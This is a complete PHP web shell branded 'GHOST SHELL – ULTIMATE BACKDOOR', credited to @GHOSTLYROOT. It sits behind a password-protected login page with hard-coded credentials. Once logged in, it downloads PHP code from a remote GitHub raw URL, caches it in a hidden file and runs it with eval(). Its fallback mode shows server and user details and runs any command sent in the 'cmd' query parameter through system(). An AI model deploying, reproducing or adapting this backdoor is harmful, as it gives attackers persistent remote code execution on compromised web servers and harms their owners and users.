<?php
error_reporting(0);
ini_set('display_errors', 0);

// ====== KONFIGURASI SESSION ======
if (session_status() === PHP_SESSION_NONE) {
    session_set_cookie_params([
        'lifetime' => 3600,
        'path' => '/',
        'domain' => '',
        'secure' => false,
        'httponly' => true,
        'samesite' => 'Strict'
    ]);
    session_start();
}

// ====== KONFIGURASI LOGIN ======
define('USERNAME', 'n4th4n');
define('PASSWORD', 'shell@2026');
define('MAX_ATTEMPTS', 5);
define('LOCKOUT_TIME', 300);

// Inisialisasi session variables
if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
}
if (!isset($_SESSION['last_attempt_time'])) {
    $_SESSION['last_attempt_time'] = 0;
}
if (!isset($_SESSION['authenticated'])) {
    $_SESSION['authenticated'] = false;
}

// ====== FUNGSI TAMPILAN LOGIN ======
function showLogin($error = '') {
    // Bersihkan output
    while (ob_get_level()) ob_end_clean();
    
    // Redirect jika sudah login
    if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
        header('Location: ' . $_SERVER['SCRIPT_NAME']);
        exit;
    }
    
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>GHOST SHELL</title>
        <style>
            @import url("https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap");
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                font-family: "Orbitron", monospace;
                background: #0a0a0f;
                background-image: 
                    radial-gradient(ellipse at 30% 40%, rgba(0, 255, 200, 0.03) 0%, transparent 60%),
                    radial-gradient(ellipse at 70% 60%, rgba(255, 0, 200, 0.03) 0%, transparent 60%);
            }
            .container {
                background: rgba(10, 10, 20, 0.95);
                padding: 50px 45px 40px;
                border-radius: 24px;
                border: 1px solid rgba(0, 255, 200, 0.15);
                box-shadow: 0 0 60px rgba(0, 255, 200, 0.05), inset 0 0 60px rgba(0, 255, 200, 0.02);
                width: 380px;
                text-align: center;
                position: relative;
                backdrop-filter: blur(10px);
            }
            .container::before {
                content: "";
                position: absolute;
                top: -2px; left: -2px; right: -2px; bottom: -2px;
                border-radius: 26px;
                background: linear-gradient(45deg, #00ffc8, transparent, #ff00c8, transparent);
                background-size: 300% 300%;
                z-index: -1;
                animation: borderGlow 4s ease infinite;
                opacity: 0.3;
            }
            @keyframes borderGlow {
                0% { background-position: 0% 50%; }
                50% { background-position: 100% 50%; }
                100% { background-position: 0% 50%; }
            }
            .logo {
                width: 100px;
                height: 100px;
                border-radius: 50%;
                border: 2px solid #00ffc8;
                box-shadow: 0 0 40px rgba(0, 255, 200, 0.2);
                margin-bottom: 20px;
                display: flex;
                align-items: center;
                justify-content: center;
                margin-left: auto;
                margin-right: auto;
                font-size: 50px;
                background: rgba(0, 255, 200, 0.05);
                color: #00ffc8;
            }
            h1 {
                color: #00ffc8;
                font-size: 30px;
                font-weight: 900;
                letter-spacing: 6px;
                text-shadow: 0 0 30px rgba(0, 255, 200, 0.3);
                margin-bottom: 5px;
            }
            .sub {
                color: #445;
                font-size: 11px;
                letter-spacing: 4px;
                margin-bottom: 30px;
                font-family: "Courier New", monospace;
            }
            .error {
                color: #ff3355;
                background: rgba(255, 0, 50, 0.08);
                padding: 12px;
                border-radius: 10px;
                margin-bottom: 20px;
                font-size: 12px;
                border-left: 3px solid #ff3355;
                font-family: "Courier New", monospace;
                letter-spacing: 1px;
            }
            input[type="text"], input[type="password"] {
                width: 100%;
                padding: 15px 18px;
                margin: 10px 0;
                background: rgba(0, 0, 0, 0.5);
                border: 1px solid rgba(0, 255, 200, 0.1);
                border-radius: 12px;
                color: #00ffc8;
                font-size: 14px;
                font-family: "Courier New", monospace;
                outline: none;
                transition: 0.3s;
                letter-spacing: 1px;
            }
            input[type="text"]:focus, input[type="password"]:focus {
                border-color: #00ffc8;
                box-shadow: 0 0 25px rgba(0, 255, 200, 0.1);
                background: rgba(0, 0, 0, 0.7);
            }
            input[type="text"]::placeholder, input[type="password"]::placeholder {
                color: #334;
                letter-spacing: 2px;
                font-size: 11px;
            }
            input[type="submit"] {
                width: 100%;
                padding: 16px;
                background: linear-gradient(135deg, #00ffc8, #00cc99);
                border: none;
                border-radius: 12px;
                font-size: 16px;
                font-weight: 700;
                font-family: "Orbitron", monospace;
                color: #0a0a0a;
                cursor: pointer;
                transition: 0.3s;
                margin-top: 20px;
                letter-spacing: 4px;
                text-transform: uppercase;
                box-shadow: 0 0 30px rgba(0, 255, 200, 0.15);
            }
            input[type="submit"]:hover {
                transform: scale(1.02);
                box-shadow: 0 0 50px rgba(0, 255, 200, 0.3);
            }
            input[type="submit"]:active {
                transform: scale(0.97);
            }
            .credit {
                margin-top: 25px;
                color: #334;
                font-size: 11px;
                letter-spacing: 3px;
                font-family: "Courier New", monospace;
            }
            .credit span {
                color: #00ffc8;
                text-shadow: 0 0 15px rgba(0, 255, 200, 0.2);
            }
            .dot {
                display: inline-block;
                width: 8px;
                height: 8px;
                background: #00ffc8;
                border-radius: 50%;
                margin-right: 10px;
                animation: pulse 1.5s infinite;
                box-shadow: 0 0 20px rgba(0, 255, 200, 0.5);
                vertical-align: middle;
            }
            @keyframes pulse {
                0%, 100% { opacity: 1; transform: scale(1); }
                50% { opacity: 0.2; transform: scale(0.7); }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">👻</div>
            <h1>GHOST SHELL</h1>
            <div class="sub">✦ ULTIMATE BACKDOOR ✦</div>';
    
    if ($error) {
        echo '<div class="error">⛧ ' . htmlspecialchars($error) . '</div>';
    }
    
    echo '<form method="POST" action="">
            <input type="text" name="username" placeholder="✧ USERNAME" required autocomplete="off">
            <input type="password" name="password" placeholder="✦ PASSWORD" required autocomplete="off">
            <input type="submit" value="⚡ ACCESS ⚡">
          </form>
          <div class="credit"><span class="dot"></span>CREDIT BY <span>@GHOSTLYROOT</span></div>
        </div>
    </body>
    </html>';
    exit;
}

// ====== CEK LOCKOUT ======
if ($_SESSION['login_attempts'] >= MAX_ATTEMPTS && (time() - $_SESSION['last_attempt_time']) < LOCKOUT_TIME) {
    $remaining = LOCKOUT_TIME - (time() - $_SESSION['last_attempt_time']);
    showLogin('🔒 TOO MANY ATTEMPTS • LOCKED ' . ceil($remaining/60) . ' MIN');
}

// ====== PROSES LOGIN ======
if ($_SESSION['authenticated'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
        $user = trim($_POST['username']);
        $pass = trim($_POST['password']);
        
        if ($user === USERNAME && $pass === PASSWORD) {
            $_SESSION['authenticated'] = true;
            $_SESSION['login_attempts'] = 0;
            $_SESSION['last_attempt_time'] = 0;
            session_regenerate_id(true);
            header('Location: ' . $_SERVER['SCRIPT_NAME']);
            exit;
        } else {
            $_SESSION['login_attempts']++;
            $_SESSION['last_attempt_time'] = time();
            $remaining = MAX_ATTEMPTS - $_SESSION['login_attempts'];
            if ($_SESSION['login_attempts'] >= MAX_ATTEMPTS) {
                showLogin('⛔ MAX ATTEMPTS • LOCKED 5 MIN');
            } else {
                showLogin('✘ WRONG • ' . $remaining . ' ATTEMPTS LEFT');
            }
        }
    } else {
        showLogin();
    }
}

// ====== ZONA SHELL ======
// Fungsi untuk mendapatkan shell content
function getShellContent() {
    $cache_file = __DIR__ . '/.ghost_cache.tmp';
    $remote_url = 'https://raw.githubusercontent.com/GhostlyrootB2H/Shell-Private/refs/heads/main/ghostlyroot.php';
    
    // Coba cache
    if (file_exists($cache_file) && (time() - filemtime($cache_file)) < 3600) {
        return file_get_contents($cache_file);
    }
    
    // Download remote
    $ctx = stream_context_create([
        'http' => [
            'timeout' => 10,
            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ]
    ]);
    $content = @file_get_contents($remote_url, false, $ctx);
    
    if ($content !== false) {
        // Bersihkan tag PHP
        $content = preg_replace('/^<\?php\s*/', '', $content);
        $content = preg_replace('/\?>\s*$/', '', $content);
        file_put_contents($cache_file, '<?php ' . $content);
        return $content;
    }
    
    return false;
}

// Tampilkan shell
$shell_content = getShellContent();

if ($shell_content !== false) {
    // Eksekusi shell dengan aman
    try {
        eval('?>' . $shell_content);
        exit;
    } catch (Throwable $e) {
        // Fallback ke shell manual
        $shell_content = false;
    }
}

// ====== FALLBACK SHELL MANUAL ======
if ($shell_content === false) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>GHOST SHELL - MANUAL</title>
        <style>
            body { 
                background: #0a0a0f; 
                color: #00ffc8; 
                font-family: "Courier New", monospace; 
                padding: 30px; 
                margin: 0;
            }
            .header {
                border-bottom: 1px solid rgba(0,255,200,0.2);
                padding-bottom: 15px;
                margin-bottom: 25px;
                display: flex;
                justify-content: space-between;
                align-items: center;
            }
            h1 { 
                color: #00ffc8; 
                font-size: 28px; 
                letter-spacing: 4px;
                text-shadow: 0 0 30px rgba(0,255,200,0.2);
                margin: 0;
            }
            .info {
                color: #445;
                font-size: 12px;
                letter-spacing: 2px;
            }
            .box {
                background: rgba(0,0,0,0.4);
                border: 1px solid rgba(0,255,200,0.1);
                border-radius: 12px;
                padding: 20px;
                margin: 15px 0;
            }
            .box pre {
                color: #00ffc8;
                margin: 0;
                font-size: 13px;
                overflow-x: auto;
            }
            input[type="text"] {
                background: rgba(0,0,0,0.5);
                border: 1px solid rgba(0,255,200,0.15);
                border-radius: 10px;
                padding: 12px 18px;
                color: #00ffc8;
                font-family: "Courier New", monospace;
                font-size: 14px;
                width: 70%;
                outline: none;
                transition: 0.3s;
            }
            input[type="text"]:focus {
                border-color: #00ffc8;
                box-shadow: 0 0 25px rgba(0,255,200,0.05);
            }
            input[type="submit"] {
                background: #00ffc8;
                border: none;
                border-radius: 10px;
                padding: 12px 30px;
                color: #0a0a0a;
                font-family: "Orbitron", monospace;
                font-weight: 700;
                font-size: 13px;
                letter-spacing: 2px;
                cursor: pointer;
                transition: 0.3s;
                margin-left: 10px;
            }
            input[type="submit"]:hover {
                box-shadow: 0 0 30px rgba(0,255,200,0.3);
                transform: scale(1.02);
            }
            .footer {
                margin-top: 30px;
                color: #334;
                font-size: 11px;
                letter-spacing: 3px;
                text-align: center;
                border-top: 1px solid rgba(0,255,200,0.05);
                padding-top: 20px;
            }
            .footer span {
                color: #00ffc8;
            }
            .status {
                display: inline-block;
                width: 10px;
                height: 10px;
                background: #00ffc8;
                border-radius: 50%;
                animation: pulse 1.5s infinite;
                margin-right: 10px;
                vertical-align: middle;
                box-shadow: 0 0 20px rgba(0,255,200,0.4);
            }
            @keyframes pulse {
                0%, 100% { opacity: 1; transform: scale(1); }
                50% { opacity: 0.2; transform: scale(0.7); }
            }
            .cmd-row {
                display: flex;
                gap: 10px;
                align-items: center;
                flex-wrap: wrap;
            }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>👻 GHOST SHELL</h1>
            <div class="info"><span class="status"></span>MANUAL MODE • ACTIVE</div>
        </div>
        
        <div class="box">
            <pre>
        ┌─────────────────────────────────────────┐
        │  USER    : n4th4n                      │
        │  SERVER  : <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?>
        │  PHP     : <?php echo phpversion(); ?>
        │  OS      : <?php echo php_uname('s') . ' ' . php_uname('r'); ?>
        │  PATH    : <?php echo getcwd(); ?>
        │  UID     : <?php echo function_exists('posix_getuid') ? posix_getuid() : 'N/A'; ?>
        └─────────────────────────────────────────┘
            </pre>
        </div>
        
        <form method="get" class="cmd-row">
            <input type="text" name="cmd" placeholder="$ execute command..." value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>" autofocus>
            <input type="submit" value="EXEC">
        </form>
        
        <?php if (isset($_GET['cmd']) && !empty($_GET['cmd'])): ?>
        <div class="box">
            <pre><?php 
                $cmd = $_GET['cmd'];
                echo htmlspecialchars("$ " . $cmd . "\n\n");
                system($cmd . ' 2>&1');
            ?></pre>
        </div>
        <?php endif; ?>
        
        <div class="footer">CREDIT BY <span>@GHOSTLYROOT</span> • GHOST SHELL v2.0</div>
    </body>
    </html>
    <?php
    exit;
}
?>
